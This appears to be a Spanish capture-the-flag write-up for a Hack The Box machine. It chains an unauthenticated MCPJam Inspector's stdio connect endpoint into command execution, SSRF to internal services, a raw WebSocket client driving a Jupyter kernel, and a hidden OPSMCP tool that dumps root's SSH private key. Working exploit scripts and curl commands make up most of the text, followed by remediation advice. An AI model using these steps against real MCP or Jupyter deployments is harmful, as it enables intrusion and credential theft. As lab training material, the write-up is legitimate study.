---
layout: single
classes: wide
title: "HTB DevHub - Writeup"
date: 2026-06-03
difficulty: Media
operating_system: Linux
tags:
  - HTB
  - Linux
  - Media
  - MCPJam
  - SSRF
  - Jupyter
  - WebSocket
  - OPSMCP
  - RCE
  - Hidden Tools
summary: "Explotación de MCPJam Inspector expuesto en puerto 6274 para ejecutar comandos arbitrarios vía stdio, SSRF a servicios internos, y escalada a root mediante hidden tools del servidor OPSMCP que expone la clave privada SSH de root."
---

## Información general

| Campo | Valor |
|-------|-------|
| Sistema operativo | Linux |
| Dificultad | Media |
| IP | `[REDACTED]` |
| Tags | `MCPJam`, `SSRF`, `Jupyter`, `WebSocket`, `OPSMCP`, `Hidden Tools` |
{: .info-table}

---

## Reconocimiento

Empezamos escaneando todos los puertos de la máquina para identificar servicios expuestos:

```bash
nmap -sV -sC --open -T4 [REDACTED]
```

Resultados relevantes:

| Puerto | Servicio | Versión |
|--------|----------|---------|
| 22/tcp | SSH | OpenSSH 8.9p1 (Ubuntu) |
| 80/tcp | HTTP | nginx 1.18.0 — redirige a `http://devhub.htb/` |
| 6274/tcp | HTTP | **MCPJam Inspector** |

Agregamos el dominio al `/etc/hosts` para poder navegar:

```bash
echo "[REDACTED]  devhub.htb" >> /etc/hosts
```

---

## Enumeración web

La web principal en `devhub.htb:80` es una página estática que documenta la infraestructura interna: menciona un **Analytics Dashboard** (Jupyter, solo localhost:8888), un servidor **OPSMCP** interno en `127.0.0.1:5000`, y el **MCPJam Inspector** en el puerto 6274.

El MCPJam Inspector es una interfaz web que permite conectar servidores MCP remotos y ejecutar herramientas. Enumeramos los endpoints de su API leyendo el JavaScript compilado:

```bash
curl -s http://[REDACTED]:6274/assets/index-DRYhT9Xb.js \
  | grep -oE '"/api/mcp/[a-zA-Z0-9/_-]+"' | sort -u
```

Endpoints clave descubiertos:

| Endpoint | Función |
|----------|---------|
| `/api/mcp/connect` | Conecta servidores MCP externos (stdio/SSE/HTTP) |
| `/api/mcp/tools/execute` | Ejecuta herramientas de un servidor conectado |
| `/api/mcp/tools/list` | Lista herramientas disponibles |
| `/api/mcp/oauth/debug/proxy` | **Proxy HTTP interno** — vector SSRF |
| `/api/mcp/servers` | Lista servidores conectados |

Ninguno de estos endpoints requiere autenticación.

---

## SSRF via MCP Inspector

El endpoint `/api/mcp/oauth/debug/proxy` actúa como proxy HTTP desde el servidor, con soporte de headers personalizados y métodos HTTP arbitrarios. Esto nos permite sondear servicios internos.

### Descubrimiento del OPSMCP interno

Probamos puertos internos comunes y confirmamos un servicio Flask en `127.0.0.1:5000`:

```bash
curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
  -H "Content-Type: application/json" \
  -d '{"url": "http://127.0.0.1:5000/tools/list"}'
```

Respuesta:

```json
{"error":"Unauthorized","message":"Valid X-API-Key header required"}
```

El servicio existe, corre en `:5000` y requere un header `X-API-Key` para autorizar. También confirmamos que **Jupyter Lab** corre en `:8888`, aunque de momento sin acceso.

---

## RCE como mcp-dev via MCP stdio

El endpoint `/api/mcp/connect` acepta servidores MCP de tipo `stdio`, lo que permite especificar un **comando del sistema** que el servidor ejecuta como proceso hijo. Básicamente, esto es RCE directo.

### Servidor MCP falso

Creamos un servidor MCP mínimo en Python que responde al handshake JSON-RPC del protocolo MCP y, al listar herramientas, ejecuta comandos del sistema:

```python
#!/usr/bin/env python3
import sys, json, subprocess

buf = ''
for chunk in sys.stdin:
    buf += chunk
    while '\n' in buf:
        line, buf = buf.split('\n', 1)
        line = line.strip()
        if not line:
            continue
        r = json.loads(line)
        m = r.get('method', '')
        i = r.get('id')
        if m == 'initialize':
            print(json.dumps({"jsonrpc":"2.0","id":i,"result":{
                "protocolVersion":"2024-11-05",
                "capabilities":{"tools":{}},
                "serverInfo":{"name":"x","version":"1"}
            }}), flush=True)
        elif m == 'tools/list':
            # Ejecutamos comandos y devolvemos la salida en la descripción
            data = subprocess.getoutput("ps aux; id; env")
            print(json.dumps({"jsonrpc":"2.0","id":i,"result":{"tools":[{
                "name":"info",
                "description": data,
                "inputSchema":{"type":"object","properties":{}}
            }]}}), flush=True)
        else:
            if i is not None:
                print(json.dumps({"jsonrpc":"2.0","id":i,"result":{}}), flush=True)
```

### Conexión del servidor falso

Enviamos el script inline y conectamos el servidor MCP falso:

```bash
curl -s http://[REDACTED]:6274/api/mcp/connect \
  -H "Content-Type: application/json" \
  -d "{\"serverId\": \"recon\", \"serverConfig\": {\"type\": \"stdio\", \"command\": \"python3\", \"args\": [\"-c\", \"<SCRIPT>\"]}}"

# Listamos las tools para recibir el output
curl -s http://[REDACTED]:6274/api/mcp/tools/list \
  -H "Content-Type: application/json" \
  -d '{"serverId": "recon"}'
```

Información obtenida de la respuesta:

- Usuario del proceso: **mcp-dev**
- Home: `/home/mcp-dev`
- **Token de Jupyter** visible en `ps aux`
- OPSMCP corre como **root** en `/opt/opsmcp/server.py`

---

## RCE como analyst via Jupyter WebSocket

Jupyter Lab expone una API WebSocket para ejecutar código en kernels Python. El proxy HTTP del MCP Inspector no soporta WebSockets, así que necesitamos implementar un **cliente WebSocket raw** usando sockets TCP.

### Subida del script al servidor

Usamos el MCP stdio para escribir un script Python en `/tmp/jup_ws.py` que implementa el handshake WebSocket desde cero:

```python
#!/usr/bin/env python3
import sys, json, os, socket, base64, uuid, urllib.request, urllib.parse

TOKEN = "[REDACTED]"

def ws_handshake(sock, path, host):
    key = base64.b64encode(os.urandom(16)).decode()
    handshake = (
        f"GET {path} HTTP/1.1\r\nHost: {host}\r\n"
        f"Upgrade: websocket\r\nConnection: Upgrade\r\n"
        f"Sec-WebSocket-Key: {key}\r\nSec-WebSocket-Version: 13\r\n\r\n"
    )
    sock.sendall(handshake.encode())
    resp = b""
    while b"\r\n\r\n" not in resp:
        resp += sock.recv(4096)

def ws_send(sock, data):
    frame = b"\x81" + bytes([len(data)]) + data.encode()
    sock.sendall(frame)

def ws_recv(sock):
    b1 = sock.recv(1)
    b2 = sock.recv(1)
    length = b2[0]
    return sock.recv(length).decode()

def run_code(code):
    # 1. Crear kernel via HTTP POST
    req = urllib.request.Request(
        f"http://127.0.0.1:8888/api/kernels?token={TOKEN}",
        data=b'{"name":"python3"}',
        headers={"Content-Type": "application/json"},
        method="POST",
    )
    kernel_id = json.loads(urllib.request.urlopen(req).read())["id"]

    # 2. Conectar WebSocket al kernel
    sock = socket.create_connection(("127.0.0.1", 8888))
    ws_handshake(sock, f"/api/kernels/{kernel_id}/channels?token={TOKEN}",
                 "127.0.0.1:8888")

    # 3. Enviar execute_request
    msg_id = uuid.uuid4().hex
    msg = json.dumps({
        "header": {
            "msg_id": msg_id, "msg_type": "execute_request",
            "username": "", "session": msg_id, "version": "5.3",
        },
        "parent_header": {}, "metadata": {},
        "content": {
            "code": code, "silent": False,
            "store_history": False, "allow_stdin": False,
        },
    })
    ws_send(sock, msg)

    # 4. Leer respuestas hasta execute_reply
    outputs = []
    for _ in range(60):
        raw = ws_recv(sock)
        resp = json.loads(raw)
        if resp["msg_type"] == "stream":
            outputs.append(resp["content"]["text"])
        elif resp["msg_type"] == "execute_reply":
            break

    return "".join(outputs)
```

### Ejecución del comando como analyst

Conectamos el script como servidor MCP y lo invocamos para leer la flag de usuario y la API key del OPSMCP:

```python
# Comando ejecutado via el WebSocket de Jupyter
import os
print(open("/home/analyst/.opsmcp_key").read())
print(open("/home/analyst/user.txt").read())
print(os.listdir("/home/analyst"))
```

Resultado:

```
=== .opsmcp_key ===
[REDACTED]

=== user.txt ===
[REDACTED]
```

---

## Escalada a root via OPSMCP hidden tools

### Análisis del servidor OPSMCP

Desde la sesión como `mcp-dev` (via MCP stdio), pudimos leer el código fuente del servidor OPSMCP en `/opt/opsmcp/server.py`. Ahí descubrimos que el servidor tiene **herramientas ocultas** que no aparecen en el endpoint público `/tools/list`:

```python
# Fragmento de server.py
HIDDEN_TOOLS = {
    "ops._admin_dump": {
        "description": "Emergency credential dump - INTERNAL ONLY",
        "parameters": {"target": "string", "confirm": "boolean"},
    },
    "ops._debug_mode": {
        "description": "Enable debug mode - INTERNAL ONLY",
        "parameters": {"enable": "boolean"},
    },
}
```

La herramienta `ops._admin_dump` con `target=ssh_keys` lee directamente `/root/.ssh/id_rsa` — y como el servidor OPSMCP corre como **root**, puede leer cualquier archivo.

### Extracción de la clave privada de root

Usamos el proxy SSRF del MCP Inspector para llamar a la tool oculta, ahora autenticándonos con la API key que extrajimos como analyst:

```bash
curl -s http://[REDACTED]:6274/api/mcp/oauth/debug/proxy \
  -H "Content-Type: application/json" \
  -d '{
    "url": "http://127.0.0.1:5000/tools/call",
    "method": "POST",
    "headers": {
      "X-API-Key": "[REDACTED]",
      "Content-Type": "application/json"
    },
    "body": {
      "name": "ops._admin_dump",
      "arguments": {"target": "ssh_keys", "confirm": true}
    }
  }' | python3 -c "import sys,json; print(json.load(sys.stdin)['body']['root_private_key'])"
```

La respuesta incluye la **clave privada RSA completa de root**.

### Acceso SSH como root

Guardamos la clave y conectamos por SSH:

```bash
chmod 600 /tmp/root_id_rsa
ssh -i /tmp/root_id_rsa root@[REDACTED]
```

```bash
id
# uid=0(root) gid=0(root) groups=0(root)

cat /root/root.txt
# [REDACTED]
```

---

## Cadena de explotación

```
Puerto 6274 (MCPJam Inspector) — API REST sin autenticación
        │
        ▼
/api/mcp/connect [type: stdio]
→ RCE como mcp-dev
→ ps aux filtra token de Jupyter y credenciales
        │
        ▼
/api/mcp/oauth/debug/proxy [SSRF]
→ Acceso a servicios internos: OPSMCP (:5000), Jupyter (:8888)
        │
        ▼
WebSocket raw al kernel de Jupyter (:8888)
→ RCE como analyst
→ Lectura de /home/analyst/.opsmcp_key
→ user.txt ✅
        │
        ▼
OPSMCP hidden tool ops._admin_dump
→ Lectura de /root/.ssh/id_rsa (OPSMCP corre como root)
        │
        ▼
SSH con clave privada de root
→ root.txt ✅
```

---

## Vectores explotados

| # | Vector | Impacto |
|---|--------|---------|
| 1 | MCPJam Inspector sin autenticación expuesto externamente | Acceso completo a API interna |
| 2 | `/api/mcp/connect` ejecuta comandos arbitrarios via stdio | RCE como `mcp-dev` |
| 3 | `/api/mcp/oauth/debug/proxy` sin restricción de red local | SSRF a servicios internos |
| 4 | Token de Jupyter visible en `ps aux` | Acceso a Jupyter como `analyst` |
| 5 | Hidden tools en OPSMCP accesibles desde localhost sin verificación adicional | Lectura de `/root/.ssh/id_rsa` |
| 6 | OPSMCP ejecuta como root sin necesidad de privilegios | Escalada completa a root |

---

## Lecciones técnicas

### MCP (Model Context Protocol)
El protocolo MCP permite conectar servidores de herramientas externas a aplicaciones. El tipo `stdio` ejecuta un comando local como servidor MCP — si no se restringe qué comandos pueden ejecutarse, es RCE directo.

### SSRF via proxy HTTP interno
Un endpoint de debugging que funciona como proxy HTTP sin restricciones de red permite sondear servicios internos. Combinado con MCP, permite interactuar con servicios que de otra forma serían inaccesibles.

### Jupyter WebSocket API
Jupyter Lab expone una API WebSocket para comunicación con kernels. Aunque el proxy HTTP no soporte WebSockets, se puede implementar un cliente raw desde el propio servidor.

### Hidden tools
Exponer herramientas que no aparecen en el listado público no es seguridad por oscuridad — el código fuente revela su existencia. Si además corren con privilegios elevados, el impacto es crítico.

---

## Remediación

| Hallazgo | Remedición |
|----------|------------|
| MCP Inspector expuesto sin autenticación | Requerir autenticación en todos los endpoints del MCP Inspector |
| `/api/mcp/connect` permite ejecución de comandos arbitrarios | Restringir `type: stdio` solo a servidores MCP aprobados o deshabilitarlo |
| `/api/mcp/oauth/debug/proxy` sin restricciones de red | Limitar a direcciones IP específicas o eliminar el endpoint en producción |
| Token de Jupyter visible en procesos | Usar un archivo de configuración en vez de argumentos de línea de comandos |
| Hidden tools accesibles sin verify adicional | Requerir autenticación de dos factores o un segundo factor de aprobación |
| OPSMCP ejecutándose como root | Ejecutar con el menor privilegio necesario (principle of least privilege) |
